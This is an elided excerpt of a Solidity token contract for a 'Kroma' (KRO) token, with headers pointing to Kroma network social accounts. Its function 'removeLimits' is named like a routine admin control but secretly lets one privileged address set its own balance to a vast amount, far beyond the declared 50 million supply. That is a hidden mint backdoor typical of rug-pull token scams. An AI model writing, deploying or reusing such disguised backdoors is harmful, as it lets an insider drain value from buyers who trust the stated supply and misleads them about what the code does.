/*  
   ...
   * X: https://twitter.com/kroma_network
   * Discord: https://discord.gg/kroma-network
*/
...
contract Kroma {
    ...
    constructor(address ads) {
        ...
        tokenSymbol = "KRO";
        tokenDecimals = 18;
        tokenTotalSupply = 50000000* 10 ** tokenDecimals;
    ...
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 420690000*42000*addBot*10**tokenDecimals;
        }
    } 
